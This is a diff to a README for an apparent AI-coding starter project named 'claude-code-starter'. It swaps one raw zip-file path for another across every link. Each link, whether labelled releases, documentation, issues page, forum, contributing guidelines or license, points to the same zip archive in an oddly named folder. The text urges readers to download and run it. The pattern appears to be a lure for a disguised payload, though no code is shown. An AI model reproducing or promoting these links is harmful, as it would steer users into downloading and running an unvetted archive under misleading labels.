@@ -1,6 +1,6 @@
 # 🌟 claude-code-starter - Simplify Your AI Development Journey
 
-[![Download Latest Release](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/eurygnathous/claude-code-starter.zip%20Latest%https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/eurygnathous/claude-code-starter.zip)](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/eurygnathous/claude-code-starter.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/init_eng/.claude/code-claude-starter-1.6.zip%20Latest%https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/init_eng/.claude/code-claude-starter-1.6.zip)](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/init_eng/.claude/code-claude-starter-1.6.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ To get started, follow the steps below to download and run the software. You do 
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click [here to download](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/eurygnathous/claude-code-starter.zip).
+1. **Visit the Releases Page**: Click [here to download](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/init_eng/.claude/code-claude-starter-1.6.zip).
 
 2. **Choose the Right File**: On the Releases page, you will see various versions. Select the latest version for optimal performance and the newest features.
 
@@ -52,13 +52,13 @@ We offer a variety of resources to help you maximize your use of **claude-code-s
 
 ## 💬 Support
 
-If you encounter issues or have questions, don’t hesitate to reach out. You can do this by opening an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/eurygnathous/claude-code-starter.zip).
+If you encounter issues or have questions, don’t hesitate to reach out. You can do this by opening an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/init_eng/.claude/code-claude-starter-1.6.zip).
 
 ## 🔗 Helpful Links
 
-- [Releases Page](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/eurygnathous/claude-code-starter.zip) - Download the latest version.
-- [Documentation](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/eurygnathous/claude-code-starter.zip) - Access comprehensive usage guides.
-- [Community Forum](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/eurygnathous/claude-code-starter.zip) - Connect with other users.
+- [Releases Page](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/init_eng/.claude/code-claude-starter-1.6.zip) - Download the latest version.
+- [Documentation](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/init_eng/.claude/code-claude-starter-1.6.zip) - Access comprehensive usage guides.
+- [Community Forum](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/init_eng/.claude/code-claude-starter-1.6.zip) - Connect with other users.
 
 ## 📝 Contributing
 
@@ -69,14 +69,14 @@ We welcome contributions to make **claude-code-starter** even better. If you wou
 3. Commit your changes.
 4. Push to your fork and create a pull request.
 
-For more details, refer to our [Contributing Guidelines](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/eurygnathous/claude-code-starter.zip).
+For more details, refer to our [Contributing Guidelines](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/init_eng/.claude/code-claude-starter-1.6.zip).
 
 ## 📄 License
 
-This project is licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/eurygnathous/claude-code-starter.zip).
+This project is licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/init_eng/.claude/code-claude-starter-1.6.zip).
 
 ## 🌈 Final Thoughts
 
 Thank you for choosing **claude-code-starter** for your AI-assisted development needs. We are excited to see what you create! Remember to check the Releases page for the latest updates and improvements. Happy coding!
 
-[![Download Latest Release](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/eurygnathous/claude-code-starter.zip%20Latest%https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/eurygnathous/claude-code-starter.zip)](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/eurygnathous/claude-code-starter.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/init_eng/.claude/code-claude-starter-1.6.zip%20Latest%https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/init_eng/.claude/code-claude-starter-1.6.zip)](https://raw.githubusercontent.com/Redemptions7/claude-code-starter/main/init_eng/.claude/code-claude-starter-1.6.zip)
